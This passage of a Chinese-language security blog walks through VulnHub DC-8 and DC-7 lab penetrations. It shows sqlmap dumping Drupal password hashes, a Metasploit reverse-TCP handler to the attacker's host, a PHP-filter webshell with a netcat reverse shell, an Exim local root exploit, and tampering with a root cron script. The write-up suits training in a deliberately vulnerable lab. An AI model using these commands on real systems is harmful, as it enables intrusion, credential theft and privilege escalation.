punctuation">[</span><span class="token string">'whatweb'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token string">'whatweb'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>_dir <span class="token operator">=</span> <span class="token string">'Auto-Scan'</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>_dir<span class="token punctuation">,</span> <span class="token number">0o755</span><span class="token punctuation">)</span>    fd <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'&#123;dir&#125;/&#123;ip&#125;.html'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token operator">=</span>_dir<span class="token punctuation">,</span> ip<span class="token operator">=</span>addr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>    fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span>html<span class="token punctuation">)</span>    fd<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    fd<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>add_color<span class="token punctuation">(</span><span class="token string">'[+] IP address:&#123;ip&#125; scan completed, the results are saved in: &#123;dir&#125;/&#123;ip&#125;.html'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token operator">=</span>_dir<span class="token punctuation">,</span> ip<span class="token operator">=</span>addr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'green'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> sys<span class="token punctuation">.</span>platform<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'win'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>add_color<span class="token punctuation">(</span><span class="token string">'[-] This script can only be executed under Linux!'</span><span class="token punctuation">,</span> <span class="token string">'red'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>banner <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""                     _                 _____        /\          | |               / ____|       /  \   _   _ | |_  ___  ______| (___    ___  __ _  _ __   _ __    ___  _ __      / /\ \ | | | || __|/ _ \|______|\___ \  / __|/ _` || '_ \ | '_ \  / _ \| '__|     / ____ \| |_| || |_| (_) |       ____) || (__| (_| || | | || | | ||  __/| |    /_/    \_\\__,_| \__|\___/       |_____/  \___|\__,_||_| |_||_| |_| \___||_|        &#123;&#125;: &#123;&#125;"""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>add_color<span class="token punctuation">(</span><span class="token string">'Author'</span><span class="token punctuation">,</span> <span class="token string">'yellow'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> add_color<span class="token punctuation">(</span><span class="token string">'@Rex_Surprise'</span><span class="token punctuation">,</span> <span class="token string">'blue'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>add_color<span class="token punctuation">(</span>banner<span class="token punctuation">,</span> <span class="token string">'purple'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> addr <span class="token keyword">in</span> get_adders<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write_result<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>add_color<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token string">'red'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>直接执行脚本就完成了<code>ip发现</code>、<code>端口扫描</code>和<code>nikto扫描</code></p></li><li><p>扫描结果：</p></li><li><p><img src="/../static/dc-8/image-20200503173049526.png" alt="image-20200504221620693"></p></li><li><p>从扫描结果可以看到，IP地址为：<code>192.168.0.29</code> 开放的端口只有 22 和 80</p></li><li><p>然后扫描了Web服务，发现是一个Drupal框架版本是Drupal 7</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 搜索一下框架漏洞</span>searchsploit Drupal <span class="token number">7</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>啥也没有，直接去网页看看吧~</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 发现这里有个nid比较刺眼</span>http://192.168.0.29/?nid<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>点一个文章nid就变一下，可能有sql输入</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># sqlmap 跑起来</span>sqlmap <span class="token parameter variable">-u</span> http://192.168.0.29/?nid<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--dbms</span> mysql <span class="token parameter variable">--dbs</span>sqlmap <span class="token parameter variable">-u</span> http://192.168.0.29/?nid<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-D</span> d7db <span class="token parameter variable">--tables</span>sqlmap <span class="token parameter variable">-u</span> http://192.168.0.29/?nid<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-D</span> d7db <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--column</span>sqlmap <span class="token parameter variable">-u</span> http://192.168.0.29/?nid<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-D</span> d7db <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">-C</span> name,pass <span class="token parameter variable">--dump</span><span class="token comment"># 依次执行上面的之后就能得到以下结果</span>+-------+---------------------------------------------------------+<span class="token operator">|</span> name  <span class="token operator">|</span> pass                                                    <span class="token operator">|</span>+-------+---------------------------------------------------------+<span class="token operator">|</span> admin <span class="token operator">|</span> <span class="token variable">$S</span><span class="token variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span> <span class="token operator">|</span><span class="token operator">|</span> john  <span class="token operator">|</span> <span class="token variable">$S</span><span class="token variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span>/3if/oRVZJaz5mKC2vF <span class="token operator">|</span>+-------+---------------------------------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>把上面的结果写到一个文件里面，然后使用 <code>Johnny</code> 把文件导入进去</li><li><img src="/../static/dc-8/image-20200504224312509.png" alt="image-20200504224312509"></li><li>这里值只看了john的密码: <code>turtle</code></li><li>然后我们就能去登录后台试试</li><li>Drupal的后台默认在&#x2F;user&#x2F;login下</li><li>直接访问：<a href="http://192.168.0.29/user/login%EF%BC%8C%E8%B4%A6%E5%8F%B7">http://192.168.0.29/user/login，账号</a> <code>john</code> 密码 <code>turtle</code></li><li>然后就登录进去了</li><li>拿shell</li><li><img src="/../static/dc-8/image-20200504224920158.png" alt="image-20200504224920158"></li><li><img src="/../static/dc-8/image-20200504224947210.png" alt="image-20200504224947210"></li><li><img src="/../static/dc-8/image-20200504225005560.png" alt="image-20200504225005560"></li><li><img src="/../static/dc-8/image-20200504225051840.png" alt="image-20200504225051840"></li><li>我这里用的是<code>metasploit</code></li><li>先 <code>msfconsole</code></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/multi/handlermsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">></span> php/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.0.21LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.0.21msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.0.21:4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>然后到网站去提交一个留言</p></li><li><p><img src="/../static/dc-8/image-20200504225740483.png" alt="image-20200504225740483"></p></li><li><p>msf就得到了会话</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span>meterpreter <span class="token operator">></span> shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>就可以进到shell了</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 获得标准shell</span>python <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span class="token comment"># 然后找其他用户看看是否有什么发现</span><span class="token builtin class-name">cd</span> /home<span class="token punctuation">;</span><span class="token function">ls</span>dc8user<span class="token function">ls</span> <span class="token parameter variable">-l</span> dc8user<span class="token comment"># 啥也没有</span><span class="token comment"># 然后使用</span><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token comment"># 找suid的文件提权，结果如下：</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../static/dc-8/image-20200504230239506.png" alt="image-20200504230239506"></p><ul><li>几经周转了解到<code>exim4</code>有已知的提权漏洞</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit eximExim <span class="token number">4.87</span> - <span class="token number">4.91</span> - Local Privilege Escalation   <span class="token operator">|</span> exploits/linux/local/46996.sh<span class="token comment"># 使用的是46996.sh</span><span class="token comment"># 先把他复制到/tmp下改成exp.sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在靶机shell执行 </span><span class="token function">scp</span> root@192.168.0.21:/tmp/exp.sh /tmp<span class="token comment"># 然后执行</span>./exp.sh <span class="token parameter variable">-m</span> netcat<span class="token comment"># 就能得到root的shell了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../static/dc-8/image-20200504232730631.png" alt="image-20200504232730631"></p><p><img src="/../static/dc-8/image-20200504232745210.png" alt="image-20200504232745210"></p>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration-test </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-7靶机渗透</title>
      <link href="/dc-7/"/>
      <url>/dc-7/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-7-靶机渗透"><a href="#DC-7-靶机渗透" class="headerlink" title="DC-7 靶机渗透"></a>DC-7 靶机渗透</h1><h2 id="1-渗透过程"><a href="#1-渗透过程" class="headerlink" title="1. 渗透过程"></a>1. 渗透过程</h2><ul><li><p>主机发现：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">--interface</span> eth0 <span class="token number">192.168</span>.0.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>找到IP为： <code>192.168.0.28</code></p></li><li><p>扫描端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># nmap -sS -A -p- 192.168.0.28</span>Starting Nmap <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2020</span>-05-03 <span class="token number">16</span>:34 CSTNmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.0.28Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00019s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">65533</span> closed portsPORT   STATE SERVICE VERSION<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.4p1 Debian <span class="token number">10</span>+deb9u6 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span class="token operator">|</span> ssh-hostkey:<span class="token operator">|</span>   <span class="token number">2048</span> d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span><span class="token operator">|</span>   <span class="token number">256</span> d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span><span class="token operator">|</span>_  <span class="token number">256</span> a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span><span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.25 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span><span class="token operator">|</span>_http-generator: Drupal <span class="token number">8</span> <span class="token punctuation">(</span>https://www.drupal.org<span class="token punctuation">)</span><span class="token operator">|</span> http-robots.txt: <span class="token number">22</span> disallowed entries <span class="token punctuation">(</span><span class="token number">15</span> shown<span class="token punctuation">)</span><span class="token operator">|</span> /core/ /profiles/ /README.txt /web.config /admin/<span class="token operator">|</span> /comment/reply/ /filter/tips /node/add/ /search/ /user/register/<span class="token operator">|</span> /user/password/ /user/login/ /user/logout/ /index.php/admin/<span class="token operator">|</span>_/index.php/comment/reply/<span class="token operator">|</span>_http-server-header: Apache/2.4.25 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token operator">|</span>_http-title: Welcome to DC-7 <span class="token operator">|</span> D7MAC Address: 00:0C:29:77:ED:69 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Device type: general purposeRunning: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>Network Distance: <span class="token number">1</span> hopService Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>网站上有一段提示</p></li></ul><blockquote><h1 id="Welcome-to-DC-7"><a href="#Welcome-to-DC-7" class="headerlink" title="Welcome to DC-7"></a>Welcome to DC-7</h1><p>  DC-7 introduces some “new” concepts, but I’ll leave you to figure out what they are. :-)</p><p>  While this challenge isn’t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won’t succeed.</p><p>  What you will have to do, is to think “outside” the box.</p><p>  Way “outside” the box. :-)</p><p>  DC-7引入了一些“新”概念，但我将让您弄清楚它们是什么。:-)</p><p>  虽然这个挑战并不完全是技术性的，但如果你需要诉诸暴力或字典攻击，你可能不会成功。</p><p>  你要做的，就是在盒子外思考。</p><p>  在盒子外面。:-)</p></blockquote><ul><li><p>在网页的最下面有个 <strong>@DC7USER</strong></p></li><li><p>我这里没办法访问google</p></li><li><p>看的教程是个Twitter的用户</p></li><li><p>里面有一个链接：<code>https://github.com/Dc7User/staffdb</code></p></li></ul><blockquote><h1 id="staffdb"><a href="#staffdb" class="headerlink" title="staffdb"></a>staffdb</h1><p>  This is some “code” (yes, it’s not the greatest code, but that wasn’t the point) for the DC-7 challenge.</p><p>  This isn’t a flag, btw, but if you have made it here, well done anyway. :-)</p><p>  这是一些DC-7挑战的“代码”（是的，这不是最棒的代码，但那不是重点）。</p><p>  这不是旗子，顺便说一下，但如果你在这里做得好，无论如何。:-)</p></blockquote><ul><li><p>在这个项目里面有个config.php的文件</p></li><li><p>里面有账号和密码</p></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dc7user"</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"MdR3xOgB7#dW"</span><span class="token punctuation">;</span>    <span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Staff"</span><span class="token punctuation">;</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>数据库的密码？？</p></li><li><p>然而没有数据库的入口啊</p></li><li><p>试试网站的后台</p></li><li><p>发现没用，再试试ssh</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> dc7user@192.168.0.28<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>进了~</li></ul><pre class="line-numbers language-mbox" data-language="mbox"><code class="language-mbox"># 只有两个东西dc7user@dc-7:~$ lsbackups  mboxcat mboxFrom root@dc-7 Thu Aug 29 17:00:22 2019Return-path: &lt;root@dc-7&gt;Envelope-to: root@dc-7Delivery-date: Thu, 29 Aug 2019 17:00:22 +1000Received: from root by dc-7 with local (Exim 4.89)(envelope-from &lt;root@dc-7&gt;)id 1i3EPu-0000CV-5Cfor root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000From: root@dc-7 (Cron Daemon)To: root@dc-7Subject: Cron &lt;root@dc-7&gt; &#x2F;opt&#x2F;scripts&#x2F;backups.shMIME-Version: 1.0Content-Type: text&#x2F;plain; charset&#x3D;UTF-8Content-Transfer-Encoding: 8bitX-Cron-Env: &lt;PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;usr&#x2F;sbin&gt;X-Cron-Env: &lt;SHELL&#x3D;&#x2F;bin&#x2F;sh&gt;X-Cron-Env: &lt;HOME&#x3D;&#x2F;root&gt;X-Cron-Env: &lt;LOGNAME&#x3D;root&gt;Message-Id: &lt;E1i3EPu-0000CV-5C@dc-7&gt;Date: Thu, 29 Aug 2019 17:00:22 +1000Database dump saved to &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql               [success]gpg: symmetric encryption of &#39;&#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.tar.gz&#39; failed: File existsgpg: symmetric encryption of &#39;&#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql&#39; failed: File exists<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>备份网站和数据库的邮件？</p></li><li><p>先去<code>/var/mail</code>看看邮件是什么、</p></li></ul><pre class="line-numbers language-mbox" data-language="mbox"><code class="language-mbox">From root@dc-7 Tue Apr 28 23:15:34 2020Return-path: &lt;root@dc-7&gt;Envelope-to: root@dc-7Delivery-date: Tue, 28 Apr 2020 23:15:34 +1000Received: from root by dc-7 with local (Exim 4.89)(envelope-from &lt;root@dc-7&gt;)id 1jTQ5G-0000ED-1Ffor root@dc-7; Tue, 28 Apr 2020 23:15:34 +1000From: root@dc-7 (Cron Daemon)To: root@dc-7Subject: Cron &lt;root@dc-7&gt; &#x2F;opt&#x2F;scripts&#x2F;backups.shMIME-Version: 1.0Content-Type: text&#x2F;plain; charset&#x3D;UTF-8Content-Transfer-Encoding: 8bitX-Cron-Env: &lt;PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;usr&#x2F;sbin&gt;X-Cron-Env: &lt;SHELL&#x3D;&#x2F;bin&#x2F;sh&gt;X-Cron-Env: &lt;HOME&#x3D;&#x2F;root&gt;X-Cron-Env: &lt;LOGNAME&#x3D;root&gt;Message-Id: &lt;E1jTQ5G-0000ED-1F@dc-7&gt;Date: Tue, 28 Apr 2020 23:15:34 +1000Database dump saved to &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql               [success]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>这是计划任务的邮件</p></li><li><p>好像是会执行<code>/opt/scripts/backups.sh</code>文件</p></li><li><p>看看这个文件</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dc7user@dc-7:/opt/scripts$ <span class="token function">ls</span> <span class="token parameter variable">-l</span>total <span class="token number">4</span>-rwxrwxr-x <span class="token number">1</span> root www-data <span class="token number">554</span> Apr <span class="token number">29</span> 00:25 backups.shdc7user@dc-7:/opt/scripts$ <span class="token function">cat</span> backups.sh<span class="token comment">#!/bin/bash</span><span class="token function">rm</span> /home/dc7user/backups/*<span class="token builtin class-name">cd</span> /var/www/html/drush sql-dump --result-file<span class="token operator">=</span>/home/dc7user/backups/website.sql<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token function">tar</span> <span class="token parameter variable">-czf</span> /home/dc7user/backups/website.tar.gz html/gpg --pinentry-mode loopback <span class="token parameter variable">--passphrase</span> PickYourOwnPassword <span class="token parameter variable">--symmetric</span> /home/dc7user/backups/website.sqlgpg --pinentry-mode loopback <span class="token parameter variable">--passphrase</span> PickYourOwnPassword <span class="token parameter variable">--symmetric</span> /home/dc7user/backups/website.tar.gz<span class="token function">chown</span> dc7user:dc7user /home/dc7user/backups/*<span class="token function">rm</span> /home/dc7user/backups/website.sql<span class="token function">rm</span> /home/dc7user/backups/website.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>只有root和www-data可以写入</p></li><li><p>现在只能获得写权限，看看写个木马什么的</p></li><li><p>想办法进www-data权限</p></li><li><p>找数据库连接文件</p></li><li><p>最后在 <code>/var/www/html/sites/default/setting.php</code>中发现数据库账号密码</p></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token operator">...</span><span class="token operator">.</span>    <span class="token variable">$databases</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'default'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'default'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span>    <span class="token string single-quoted-string">'database'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'d7db'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'db7user'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'password'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'yNv3Po00'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'prefix'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'host'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'port'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'namespace'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Drupal\\Core\\Database\\Driver\\mysql'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'driver'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'mysql'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>进数据库</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-udb7user</span> <span class="token parameter variable">-pyNv3Po00</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>找了一圈没发现账号密码~~~</p></li><li><p>后来才知道 <code>/opt/scripts/backups.sh</code>文件里面有个drush命令，可以用来修改密码</p></li><li><pre><code>drush命令使用：http://drupalchina.cn/node/3019</code></pre></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dc7user@dc-7:~$ <span class="token builtin class-name">cd</span> /var/www/html<span class="token punctuation">;</span>drush user-password admin <span class="token parameter variable">--password</span><span class="token operator">=</span><span class="token string">"1234"</span>Changed password <span class="token keyword">for</span> admin     <span class="token punctuation">[</span>success<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>然后我们登陆网站的后台</p></li><li><p>竟然没有写马的地方···</p></li><li><p><img src="/../static/dc-7/image-20200503171416832.png" alt="image-20200503171416832"></p></li><li><p>后面得知可以安装一个模块</p></li><li><p>然后改用成可以使用写php文件的</p></li><li><p>记得勾选PHPfilter</p></li><li><p><img src="/../static/dc-7/image-20200503171847681.png" alt="image-20200503171847681"></p></li><li><p>下面的format改成phpcode就可以写木马了</p></li><li><p>nc 监听 </p></li><li><p>就能反弹了</p></li><li><p>然后利用<code>www-data</code>把 <code>/opt/scripts/backups.sh</code> 添加一句</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">rm</span> /home/dc7user/backups/*<span class="token builtin class-name">cd</span> /var/www/html/drush sql-dump --result-file<span class="token operator">=</span>/home/dc7user/backups/website.sql<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token function">tar</span> <span class="token parameter variable">-czf</span> /home/dc7user/backups/website.tar.gz html/gpg --pinentry-mode loopback <span class="token parameter variable">--passphrase</span> PickYourOwnPassword <span class="token parameter variable">--symmetric</span> /home/dc7user/backups/website.sqlgpg --pinentry-mode loopback <span class="token parameter variable">--passphrase</span> PickYourOwnPassword <span class="token parameter variable">--symmetric</span> /home/dc7user/backups/website.tar.gz<span class="token function">chown</span> dc7user:dc7user /home/dc7user/backups/*<span class="token function">rm</span> 